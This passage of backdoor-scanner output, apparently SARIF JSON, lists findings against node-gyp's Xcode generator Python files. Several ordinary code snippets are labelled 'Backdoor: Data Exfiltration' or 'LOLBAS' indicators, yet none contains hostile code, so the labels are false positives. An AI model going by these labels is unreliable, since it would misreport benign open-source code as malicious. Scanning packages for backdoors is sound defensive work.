                    "text": "                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n                    )\n\n",
                    "rendered": {
                      "text": "                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n                    )\n\n",
                      "markdown": "`                        script\n                        + 'cd \"%s\"\\n'\n                        % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n                            command.get(\"working_directory\")\n                        )\n                    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 278,
                  "startColumn": 26,
                  "endLine": 278,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n",
                    "rendered": {
                      "text": "\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n",
                      "markdown": "`\n                command = target[\"run_as\"]\n                script = \"\"\n                if command.get(\"working_directory\"):\n                    script = (\n                        script\n                        + 'cd \"%s\"\\n'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 262,
                  "startColumn": 21,
                  "endLine": 262,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n            # If this target has a 'run_as' attribute, add its target to the\n            # targets, and add it to the test targets.\n            if target.get(\"run_as\"):\n                # Make a target to run something.  It should have one\n                # dependency, the parent xcode target.\n                xccl = CreateXCConfigurationList(configurations)\n",
                    "rendered": {
                      "text": "\n            # If this target has a 'run_as' attribute, add its target to the\n            # targets, and add it to the test targets.\n            if target.get(\"run_as\"):\n                # Make a target to run something.  It should have one\n                # dependency, the parent xcode target.\n                xccl = CreateXCConfigurationList(configurations)\n",
                      "markdown": "`\n            # If this target has a 'run_as' attribute, add its target to the\n            # targets, and add it to the test targets.\n            if target.get(\"run_as\"):\n                # Make a target to run something.  It should have one\n                # dependency, the parent xcode target.\n                xccl = CreateXCConfigurationList(configurations)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 254,
                  "startColumn": 29,
                  "endLine": 254,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                support_targets.append(xcode_target.support_target)\n                targets.append(xcode_target.support_target)\n\n            if not int(target.get(\"suppress_wildcard\", False)):\n                targets_for_all.append(xcode_target)\n\n            if target_name.lower() == \"all\":\n",
                    "rendered": {
                      "text": "                support_targets.append(xcode_target.support_target)\n                targets.append(xcode_target.support_target)\n\n            if not int(target.get(\"suppress_wildcard\", False)):\n                targets_for_all.append(xcode_target)\n\n            if target_name.lower() == \"all\":\n",
                      "markdown": "`                support_targets.append(xcode_target.support_target)\n                targets.append(xcode_target.support_target)\n\n            if not int(target.get(\"suppress_wildcard\", False)):\n                targets_for_all.append(xcode_target)\n\n            if target_name.lower() == \"all\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 66,
                  "endLine": 205,
                  "endColumn": 71,
                  "snippet": {
                    "text": "                )\n                if build_file_configuration_named:\n                    xcc = xccl.ConfigurationNamed(config_name)\n                    for xck, xcv in build_file_configuration_named.get(\n                        \"xcode_settings\", {}\n                    ).items():\n                        xcc.SetBuildSetting(xck, xcv)\n",
                    "rendered": {
                      "text": "                )\n                if build_file_configuration_named:\n                    xcc = xccl.ConfigurationNamed(config_name)\n                    for xck, xcv in build_file_configuration_named.get(\n                        \"xcode_settings\", {}\n                    ).items():\n                        xcc.SetBuildSetting(xck, xcv)\n",
                      "markdown": "`                )\n                if build_file_configuration_named:\n                    xcc = xccl.ConfigurationNamed(config_name)\n                    for xck, xcv in build_file_configuration_named.get(\n                        \"xcode_settings\", {}\n                    ).items():\n                        xcc.SetBuildSetting(xck, xcv)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 200,
                  "startColumn": 74,
                  "endLine": 200,
                  "endColumn": 79,
                  "snippet": {
                    "text": "        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n                    config_name, {}\n                )\n                if build_file_configuration_named:\n",
                    "rendered": {
                      "text": "        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n                    config_name, {}\n                )\n                if build_file_configuration_named:\n",
                      "markdown": "`        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n                    config_name, {}\n                )\n                if build_file_configuration_named:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 56,
                  "endLine": 197,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                self.build_file_dict[\"xcode_config_file\"]\n            )\n            xccl.SetBaseConfiguration(config_ref)\n        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n",
                    "rendered": {
                      "text": "                self.build_file_dict[\"xcode_config_file\"]\n            )\n            xccl.SetBaseConfiguration(config_ref)\n        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n",
                      "markdown": "`                self.build_file_dict[\"xcode_config_file\"]\n            )\n            xccl.SetBaseConfiguration(config_ref)\n        build_file_configurations = self.build_file_dict.get(\"configurations\", {})\n        if build_file_configurations:\n            for config_name in configurations:\n                build_file_configuration_named = build_file_configurations.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 44,
                  "endLine": 190,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        # the tree tree view for UI display.\n        # Any values set globally are applied to all configurations, then any\n        # per-configuration values are applied.\n        for xck, xcv in self.build_file_dict.get(\"xcode_settings\", {}).items():\n            xccl.SetBuildSetting(xck, xcv)\n        if \"xcode_config_file\" in self.build_file_dict:\n            config_ref = self.project.AddOrGetFileInRootGroup(\n",
                    "rendered": {
                      "text": "        # the tree tree view for UI display.\n        # Any values set globally are applied to all configurations, then any\n        # per-configuration values are applied.\n        for xck, xcv in self.build_file_dict.get(\"xcode_settings\", {}).items():\n            xccl.SetBuildSetting(xck, xcv)\n        if \"xcode_config_file\" in self.build_file_dict:\n            config_ref = self.project.AddOrGetFileInRootGroup(\n",
                      "markdown": "`        # the tree tree view for UI display.\n        # Any values set globally are applied to all configurations, then any\n        # per-configuration values are applied.\n        for xck, xcv in self.build_file_dict.get(\"xcode_settings\", {}).items():\n            xccl.SetBuildSetting(xck, xcv)\n        if \"xcode_config_file\" in self.build_file_dict:\n            config_ref = self.project.AddOrGetFileInRootGroup(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1864,
                  "startColumn": 64,
                  "endLine": 1864,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n",
                    "rendered": {
                      "text": "        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n",
                      "markdown": "`        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 23,
                  "endLine": 892,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                    + ldflag[m.end(1) :]\n                )\n        # Required for ffmpeg (no idea why they don't use LIBRARY_SEARCH_PATHS,\n        # TODO(thakis): Update ffmpeg.gyp):\n        if ldflag.startswith(\"-L\"):\n            ldflag = \"-L\" + gyp_to_build_path(ldflag[len(\"-L\") :])\n        return ldflag\n",
                    "rendered": {
                      "text": "                    + ldflag[m.end(1) :]\n                )\n        # Required for ffmpeg (no idea why they don't use LIBRARY_SEARCH_PATHS,\n        # TODO(thakis): Update ffmpeg.gyp):\n        if ldflag.startswith(\"-L\"):\n            ldflag = \"-L\" + gyp_to_build_path(ldflag[len(\"-L\") :])\n        return ldflag\n",
                      "markdown": "`                    + ldflag[m.end(1) :]\n                )\n        # Required for ffmpeg (no idea why they don't use LIBRARY_SEARCH_PATHS,\n        # TODO(thakis): Update ffmpeg.gyp):\n        if ldflag.startswith(\"-L\"):\n            ldflag = \"-L\" + gyp_to_build_path(ldflag[len(\"-L\") :])\n        return ldflag\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 40,
                  "endLine": 197,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        settings = self.xcode_settings[configname]\n        conditional_keys = [key for key in settings if key.endswith(\"]\")]\n        for key in conditional_keys:\n            # If you need more, speak up at http://crbug.com/122592\n            if key.endswith(\"[sdk=iphoneos*]\"):\n                if configname.endswith(\"iphoneos\"):\n                    new_key = key.split(\"[\")[0]\n",
                    "rendered": {
                      "text": "        settings = self.xcode_settings[configname]\n        conditional_keys = [key for key in settings if key.endswith(\"]\")]\n        for key in conditional_keys:\n            # If you need more, speak up at http://crbug.com/122592\n            if key.endswith(\"[sdk=iphoneos*]\"):\n                if configname.endswith(\"iphoneos\"):\n                    new_key = key.split(\"[\")[0]\n",
                      "markdown": "`        settings = self.xcode_settings[configname]\n        conditional_keys = [key for key in settings if key.endswith(\"]\")]\n        for key in conditional_keys:\n            # If you need more, speak up at http://crbug.com/122592\n            if key.endswith(\"[sdk=iphoneos*]\"):\n                if configname.endswith(\"iphoneos\"):\n                    new_key = key.split(\"[\")[0]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 12,
                  "endLine": 162,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _codesigning_key_cache = {}\n\n    def __init__(self, spec):\n",
                    "rendered": {
                      "text": "    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _codesigning_key_cache = {}\n\n    def __init__(self, spec):\n",
                      "markdown": "`    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _codesigning_key_cache = {}\n\n    def __init__(self, spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 12,
                  "endLine": 158,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    _sdk_root_cache = {}\n\n    # Populated lazily by GetExtraPlistItems(). Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n",
                    "rendered": {
                      "text": "    _sdk_root_cache = {}\n\n    # Populated lazily by GetExtraPlistItems(). Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n",
                      "markdown": "`    _sdk_root_cache = {}\n\n    # Populated lazily by GetExtraPlistItems(). Shared by all XcodeSettings, so\n    # cached at class-level for efficiency.\n    _plist_cache = {}\n\n    # Populated lazily by GetIOSPostbuilds.  Shared by all XcodeSettings, so\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 5,
                  "endLine": 152,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    \"\"\"A class that understands the gyp 'xcode_settings' object.\"\"\"\n\n    # Populated lazily by _SdkPath(). Shared by all XcodeSettings, so cached\n    # at class-level for efficiency.\n    _sdk_path_cache = {}\n    _platform_path_cache = {}\n    _sdk_root_cache = {}\n",
                    "rendered": {
                      "text": "    \"\"\"A class that understands the gyp 'xcode_settings' object.\"\"\"\n\n    # Populated lazily by _SdkPath(). Shared by all XcodeSettings, so cached\n    # at class-level for efficiency.\n    _sdk_path_cache = {}\n    _platform_path_cache = {}\n    _sdk_root_cache = {}\n",
                      "markdown": "`    \"\"\"A class that understands the gyp 'xcode_settings' object.\"\"\"\n\n    # Populated lazily by _SdkPath(). Shared by all XcodeSettings, so cached\n    # at class-level for efficiency.\n    _sdk_path_cache = {}\n    _platform_path_cache = {}\n    _sdk_root_cache = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 55,
                  "endLine": 97,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n",
                    "rendered": {
                      "text": "\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n",
                      "markdown": "`\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1887,
                  "startColumn": 3,
                  "endLine": 1887,
                  "endColumn": 8,
                  "snippet": {
                    "text": "def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n",
                    "rendered": {
                      "text": "def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n",
                      "markdown": "`def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1864,
                  "startColumn": 59,
                  "endLine": 1864,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n",
                    "rendered": {
                      "text": "        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n",
                      "markdown": "`        # Use a definition of edges such that user_of_variable -> used_varible.\n        # This happens to be easier in this case, since a variable's\n        # definition contains all variables it references in a single string.\n        # We can then reverse the result of the topological sort at the end.\n        # Since: reverse(topsort(DAG)) = topsort(reverse_edges(DAG))\n        matches = {v for v in regex.findall(env[node]) if v in env}\n        for dependee in matches:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1857,
                  "startColumn": 9,
                  "endLine": 1857,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  \"\"\"\n    # Since environment variables can refer to other variables, the evaluation\n    # order is important. Below is the logic to compute the dependency graph\n    # and sort it.\n    regex = re.compile(r\"\\$\\{([a-zA-Z0-9\\-_]+)\\}\")\n\n    def GetEdges(node):\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # Since environment variables can refer to other variables, the evaluation\n    # order is important. Below is the logic to compute the dependency graph\n    # and sort it.\n    regex = re.compile(r\"\\$\\{([a-zA-Z0-9\\-_]+)\\}\")\n\n    def GetEdges(node):\n",
                      "markdown": "`  \"\"\"\n    # Since environment variables can refer to other variables, the evaluation\n    # order is important. Below is the logic to compute the dependency graph\n    # and sort it.\n    regex = re.compile(r\"\\$\\{([a-zA-Z0-9\\-_]+)\\}\")\n\n    def GetEdges(node):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1851,
                  "startColumn": 1,
                  "endLine": 1851,
                  "endColumn": 6,
                  "snippet": {
                    "text": "def _TopologicallySortedEnvVarKeys(env):\n    \"\"\"Takes a dict |env| whose values are strings that can refer to other keys,\n  for example env['foo'] = '$(bar) and $(baz)'. Returns a list L of all keys of\n  env such that key2 is after key1 in L if env[key2] refers to env[key1].\n\n  Throws an Exception in case of dependency cycles.\n  \"\"\"\n",
                    "rendered": {
                      "text": "def _TopologicallySortedEnvVarKeys(env):\n    \"\"\"Takes a dict |env| whose values are strings that can refer to other keys,\n  for example env['foo'] = '$(bar) and $(baz)'. Returns a list L of all keys of\n  env such that key2 is after key1 in L if env[key2] refers to env[key1].\n\n  Throws an Exception in case of dependency cycles.\n  \"\"\"\n",
                      "markdown": "`def _TopologicallySortedEnvVarKeys(env):\n    \"\"\"Takes a dict |env| whose values are strings that can refer to other keys,\n  for example env['foo'] = '$(bar) and $(baz)'. Returns a list L of all keys of\n  env such that key2 is after key1 in L if env[key2] refers to env[key1].\n\n  Throws an Exception in case of dependency cycles.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1840,
                  "startColumn": 31,
                  "endLine": 1840,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n        string = string.replace(\"$(\" + k + \")\", v)\n",
                    "rendered": {
                      "text": "    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n        string = string.replace(\"$(\" + k + \")\", v)\n",
                      "markdown": "`    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n        string = string.replace(\"$(\" + k + \")\", v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1839,
                  "startColumn": 64,
                  "endLine": 1839,
                  "endColumn": 69,
                  "snippet": {
                    "text": "def ExpandEnvVars(string, expansions):\n    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n",
                    "rendered": {
                      "text": "def ExpandEnvVars(string, expansions):\n    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n",
